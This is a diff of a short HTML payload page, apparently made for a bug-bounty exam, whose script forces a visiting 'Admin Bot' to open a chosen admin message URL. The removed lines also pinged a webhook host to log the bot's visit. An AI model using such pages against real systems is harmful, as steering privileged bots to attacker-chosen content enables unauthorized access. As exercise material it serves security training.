@@ -1,19 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Audit</title>
+    <title>Security Audit</title>
 </head>
 <body>
     <script>
-        // 1. Log that the bot successfully reached YOUR hosted file
-        new Image().src = "https://webhooksite.net/0db7e6a4-24bc-4a8e-badb-87a632f93f7c?step=1_bot_reached_file";
-
-        // 2. Redirect the bot to your specific message
-        const targetId = "69e0f9f4bee6d6b7c662684c";
-        
-        setTimeout(() => {
-            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/" + targetId;
-        }, 500); // Small delay to ensure the log sends
+        // Forces the Admin Bot to visit your specific trap message
+        window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e0fc3dbee6d6b7c66268e5";
     </script>
 </body>
 </html>
